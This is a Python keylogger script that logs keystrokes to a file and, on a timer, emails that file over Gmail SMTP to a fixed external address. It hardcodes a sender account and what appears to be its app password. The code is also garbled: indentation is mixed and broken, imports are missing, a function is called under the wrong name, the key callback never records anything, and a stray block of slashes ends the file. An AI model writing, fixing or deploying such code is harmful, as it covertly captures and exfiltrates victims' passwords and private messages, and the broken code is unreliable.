import email, smtplib, ssl

from email import encoders
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_mail():
	port = 465
	sender_email = "dasadfs92@gmail.com"
	receiver_email = "jestemmazur1234567@gmail.com"

	# Create a multipart message and set headers
	message = MIMEMultipart()
	message["From"] = sender_email
	message["To"] = receiver_email
	files = ["cyk.txt"]
	for f in files or []:
	   with open(f, "rb") as fil:
	       part = MIMEApplication(
	           fil.read(),
	           Name=basename(f)
	       )
	   # After the file is closed
	   part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
	   message.attach(part)
	context = ssl.create_default_context()

	with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
	    server.login(sender_email, "ugxm bias eidn abyk")
	    server.sendmail(sender_email, receiver_email,message.as_string())

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
	def callback(self, event):

	     name = event.name
		if len(name) > 1:
	     if name == "space":
		           # " " instead of "space"
           name = " "
	       elif name == "enter":
	           # add a new line whenever an ENTER is pressed
	           name = "[ENTER]\n"
	       elif name == "decimal":
	           name = "."
	       else:
	           # replace spaces with underscores
	           name = name.replace(" ", "_")
	           name = f"[{name.upper()}]"
	   # finally, add the key name to our global `self.log` variable
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"cyk"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    def report(self):
       self.update_filename()
       sendmail()
       x= open("cyk.txt", "w")
       x.close()
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
"""
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
"""
